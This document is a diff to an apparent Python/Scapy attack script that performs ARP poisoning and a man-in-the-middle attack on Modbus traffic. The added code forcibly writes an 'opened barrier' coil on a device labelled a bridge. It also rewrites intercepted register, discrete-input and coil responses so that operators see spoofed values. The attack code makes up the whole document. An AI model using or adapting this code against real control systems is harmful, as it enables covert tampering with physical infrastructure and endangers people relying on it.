@@ -366,7 +366,10 @@ source from : http://stackoverflow.com/questions/12659553/man-in-the-middle-atta
 class MITM:
 	def __init__(self,targetIP, victimIP,gatewayIP):
 		global iface
-#FIXME: seemsok to use only 2 params
+
+		if gatewayIP is None:
+			gatewayIP = targetIP
+
 		self.target=(targetIP, getmacbyip(targetIP))
 		self.victim=(victimIP, getmacbyip(victimIP))
 		self.node2=(gatewayIP, getmacbyip(gatewayIP))
@@ -374,20 +377,45 @@ class MITM:
 		self.querys = {}
 
 		self.val_addr = 6 # Bridge Angle
-		self.val_spoofed = None
+		self.val_displayed = None
 
 		self.val2_addr = 3 #Opened barrier
-		self.val2_desired = False
-		self.val2_spoofed = None
+		self.val2_injected = 0xff00
+		self.val2_displayed = None
+
+		self.val3_addr = 0 #Barrier_status
+		self.val3_injected = 1
+		self.val3_displayed = None 
 
 
+		# Open connection
+		c = connectMb(targetIP)
+		
+		# Get the bridge's barreir infos
+                self.val3_displayed = getValue(c, 2, 0)
+                self.val2_displayed = getValue(c, 1, 3)
+
+		#Set the bridge position
+		myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0003, outputValue=self.val2_injected)
+		c.sr1(myPayload)
+
+		# close connection
+		c.close()
+
+		print self.val2_displayed
+		print self.val3_displayed
 
 
-		multiprocessing.Process(target=self.arp_poison).start()
-		try:
-			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) or arp'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
-		except KeyboardInterrupt as e:
-			pass
+		p = multiprocessing.Process(target=self.arp_poison)
+		p.start()
+#		try:
+		if True:
+			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) '%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
+			#sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) or arp'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
+#		except:
+#			pass
+		p.terminate()
+
 	def routep(self,packet):
 		global iface
 		#Ignore packets from me
@@ -395,8 +423,9 @@ class MITM:
 			return
 
 
+
 		#Reply to ARP who-is
-#TODO
+#FIXME
 #		if packet.haslayer(ARP):
 #			resend = False
 #			if  packet[ARP].op != 1:
@@ -430,35 +459,52 @@ class MITM:
 
 		#Assemble Query/Response
 		if packet.haslayer(ModbusADU_Request):
-			index = str(packet[IP].src) + " >> " + str(packet[IP].dst) + " [" + str(packet[ModbusADU_Request].transId) + "]" + str(packet.funcCode)
+			index = str(packet[IP].src) + ">>" + str(packet[IP].dst) + "[" + str(packet[ModbusADU_Request].transId) + "]" + str(packet.funcCode)
 			self.querys[index] = packet
+
+		#Attack02 : modify the value to write in the coil
+			if ModbusPDU05_Write_Single_Coil_Request in packet:
+				if packet[ModbusPDU05_Write_Single_Coil_Request].outputAddr == self.val2_addr:
+					if packet[ModbusPDU05_Write_Single_Coil_Request].outputValue == 0:
+						self.val3_displayed = 0
+						self.val2_displayed = 0
+					else:
+						self.val3_displayed = 1
+						self.val2_displayed = 1
+					packet[ModbusPDU05_Write_Single_Coil_Request].outputValue = self.val2_injected
+					print "Has rewritten the coil value !"
+
+
 		elif packet.haslayer(ModbusADU_Response):
-			index = str(packet[IP].dst) + " >> " + str(packet[IP].src) + " [" + str(packet[ModbusADU_Response].transId) + "]" + str(packet.funcCode)
+			index = str(packet[IP].dst) + ">>" + str(packet[IP].src) + "[" + str(packet[ModbusADU_Response].transId) + "]" + str(packet.funcCode)
 			
-			#If we do not have the query, we reject the packet
-			if self.querys[index] is None:
-				return
+			try:
+				query = self.querys[index]
+				del self.querys[index]
+			#If we do not have the query, weignore the answered packet
+			except:
+				query = None
 
-			query = self.querys[index]
-			del self.querys[index]
-
+			if query is not None:
 		#Attack 01 : Spoof an input register value
-			#If it is a reply of a request with the desired address, we modify the answer
-			if ModbusPDU04_Read_Input_Registers_Response in packet and ModbusPDU04_Read_Input_Registers_Request in query:
-				if query[ModbusPDU04_Read_Input_Registers_Request].startAddr <= self.val_addr and query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity > self.val_addr:
-					packet[ModbusPDU04_Read_Input_Registers_Response].registerVal[self.val_addr - query[ModbusPDU04_Read_Input_Registers_Request].startAddr] = self.val_spoofed
+				#If it is a reply of a request with the desired address, we modify the answer
+				if ModbusPDU04_Read_Input_Registers_Response in packet and ModbusPDU04_Read_Input_Registers_Request in query:
+					if query[ModbusPDU04_Read_Input_Registers_Request].startAddr <= self.val_addr and query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity > self.val_addr:
+						packet[ModbusPDU04_Read_Input_Registers_Response].registerVal[self.val_addr - query[ModbusPDU04_Read_Input_Registers_Request].startAddr] = self.val_displayed
+						print "Has spoofed the in reg value !"
 				
 		#Attack 02 : Spoof a coil value an prevent to write the value
-			#Read value spoof
+				if ModbusPDU02_Read_Discrete_Inputs_Response in packet and ModbusPDU02_Read_Discrete_Inputs_Request in query:
+					if query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr <= self.val3_addr and query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr + query[ModbusPDU02_Read_Discrete_Inputs_Request].quantity > self.val3_addr:
+						packet[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[self.val3_addr - query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr] = self.val3_displayed
+						print "Has spoofed the in disc value !"
 
-			#Write value spoofed
-
-#		self.val2_addr = 3 #Opened barrier
-#		self.val2_desired = False
-#		self.val2_spoofed = None
-
-
-
+				if ModbusPDU01_Read_Coils_Response in packet and ModbusPDU01_Read_Coils_Request in query:
+					if query[ModbusPDU01_Read_Coils_Request].startAddr <= self.val2_addr and query[ModbusPDU01_Read_Coils_Request].startAddr + query[ModbusPDU01_Read_Coils_Request].quantity > self.val2_addr:
+						packet[ModbusPDU01_Read_Coils_Response].coilStatus[self.val2_addr - query[ModbusPDU01_Read_Coils_Request].startAddr] = self.val2_displayed
+						print "Has spoofed the coil value !"
+	
+		print packet.summary()
 		sendp(packet, iface=iface, verbose=False)
 
 	def arp_poison(self):
@@ -661,7 +707,6 @@ def fragIdentif(ip):
 Retreive a specific value of a register
 """
 def getValue(c, code, addr, quantity=1):
-	
 	if code == 1:
 		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=quantity)		
 	elif code == 2:
@@ -672,10 +717,10 @@ def getValue(c, code, addr, quantity=1):
 		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=quantity)
 	else:
 		return None
-	
-	ans = c.sr1(pkt, verbose=verbose)
+
+	ans = c.sr1(pkt, verbose=False)
 	ans = ModbusADU_Response(str(ans))
-	
+
 	if ans.funcCode == 1:
 		return ans[ModbusPDU01_Read_Coils_Response].coilStatus[0]
 	elif ans.funcCode == 2:
